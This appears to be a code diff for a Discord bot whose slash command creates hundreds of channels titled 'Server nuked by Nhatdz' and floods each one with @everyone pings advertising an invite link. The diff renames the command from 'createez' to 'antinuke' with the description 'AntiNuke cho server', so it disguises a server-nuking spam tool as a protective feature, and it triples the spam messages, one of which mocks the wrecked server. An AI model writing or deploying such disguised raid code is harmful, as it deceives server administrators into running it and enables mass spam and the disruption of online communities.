@@ -25,13 +25,13 @@ const client = new Client({
 // ===== CONFIG =====
 const MAX_TOTAL = 510;
 const MAX_PER_RUN = 500;
-const CHANNEL_NAME = "Server Nuked by Nhatdz";
+const CHANNEL_NAME = "Server nuked by Nhatdz";
 // ==================
 
 const commands = [
   new SlashCommandBuilder()
-    .setName("createez")
-    .setDescription("Tạo tối đa 400-500 kênh ez và ping everyone (tổng tối đa 500 và có thể thấp hơn do discord)")
+    .setName("antinuke")
+    .setDescription("AntiNuke cho server")
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
 ].map(cmd => cmd.toJSON());
 
@@ -54,9 +54,11 @@ client.once("ready", () => {
   console.log(`🤖 Online: ${client.user.tag}`);
 });
 
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
 client.on("interactionCreate", async interaction => {
   if (!interaction.isChatInputCommand()) return;
-  if (interaction.commandName !== "createez") return;
+  if (interaction.commandName !== "antinuke") return;
 
   if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
     return interaction.reply({ content: "❌ Bạn không có quyền admin.", ephemeral: true });
@@ -84,12 +86,19 @@ client.on("interactionCreate", async interaction => {
 
   const tasks = [];
   for (let i = 0; i < canCreate; i++) {
-    tasks.push(
-      guild.channels.create({
+    tasks.push((async () => {
+      const ch = await guild.channels.create({
         name: CHANNEL_NAME,
         type: ChannelType.GuildText
-      }).then(ch => ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB "))
-    );
+      });
+
+      // Gửi 3 tin nhắn
+      await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+      await sleep(200);
+      await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+    })());
   }
 
   await Promise.all(tasks);
